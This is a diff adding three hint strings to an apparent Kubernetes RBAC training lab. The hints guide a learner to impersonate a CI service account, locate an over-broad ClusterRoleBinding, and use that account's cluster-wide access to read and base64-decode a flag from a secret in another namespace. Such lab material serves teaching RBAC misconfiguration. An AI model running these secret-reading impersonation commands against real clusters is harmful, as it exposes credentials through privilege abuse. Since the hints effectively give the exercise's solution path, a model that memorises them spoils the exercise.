@@ -1,0 +1,5 @@
+[
+  "You are cluster-admin, so you can act as any identity with `--as`. Start by asking what the CI account can do: `kubectl auth can-i --list --as=system:serviceaccount:dojo-rbac:ci-runner`. Look specifically for `secrets` in the resource list.",
+  "The over-grant is a ClusterRole bound by a ClusterRoleBinding, which applies in every namespace. Find it with `kubectl get clusterrolebinding` (look for a subject named `ci-runner`) and read its ClusterRole with `kubectl get clusterrole dojo-ci-runner-toobig -o yaml`.",
+  "Spend the privilege: `kubectl -n dojo-vault get secret vault-secret -o jsonpath='{.data.FLAG}' --as=system:serviceaccount:dojo-rbac:ci-runner | base64 -d`. The `--as` makes the request authorize as the SA, so its cluster-wide `get secrets` is what reads the flag."
+]
